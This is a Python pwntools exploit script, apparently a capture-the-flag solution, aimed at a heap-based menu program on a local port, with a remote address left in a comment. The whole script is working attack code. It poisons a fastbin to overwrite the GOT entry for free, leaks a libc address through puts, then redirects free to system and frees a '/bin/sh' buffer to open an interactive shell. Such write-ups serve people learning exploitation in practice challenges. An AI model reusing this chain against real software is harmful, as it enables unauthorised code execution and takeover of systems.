from pwn import *

context.arch = 'amd64'

host = '127.0.0.1'
port = 8888
# host = '35.201.132.60 '
# port = 50216
r = remote(host, port)

def create(size, content):
    r.recvuntil(':')
    r.sendline(b'1')
    r.recvuntil(':')
    r.sendline(str(size).encode())
    r.recvuntil(':')
    r.sendline(content)

def edit(index, size, content):
    r.recvuntil(':')
    r.sendline(b'2')
    r.recvuntil(':')
    r.sendline(str(index).encode())
    r.recvuntil(':')
    r.sendline(str(size).encode())
    r.recvuntil(':')
    r.sendline(content)

def delete(index):
    r.recvuntil(':')
    r.sendline(b'3')
    r.recvuntil(':')
    r.sendline(str(index).encode())

def exit():
    r.recvuntil(':')
    r.sendline(b'4')

# name # not important at all
r.recvuntil(':')
r.sendline(b'yjc')

create(0x50, 'a') #0
create(0x50, 'a') #1
create(0x200, 'a') #2
create(0x200, 'a') #3
delete(2)

# free_got = 0x602018
before_free_got = 0x602002 - 0x8
delete(1)
edit(0, 0x70, b'a'*0x50 + flat([0, 0x61, before_free_got]))

puts_plt = 0x4006b0
create(0x50, 'a') #1
create(0x50, b'a'*6 + flat([0, puts_plt])) #2 @free

# now free is printf
edit(1, 0x60, b'a'*0x60)
r.recvuntil(':')
delete(1)
r.recvuntil('a'*0x60)
main_arena = u64(r.recvuntil('\n')[:-1].ljust(8, b'\x00')) - 88
libc = main_arena - 0x36f320 - 0x55800
print('libc =', hex(libc))

free = libc + 0x3e3f50
system = libc + 0x45390
edit(2, 0x30, b'a'*6 + flat([0, system]))

# now free is system
edit(0, 0x30, b'/bin/sh\0')
delete(0)

r.interactive()
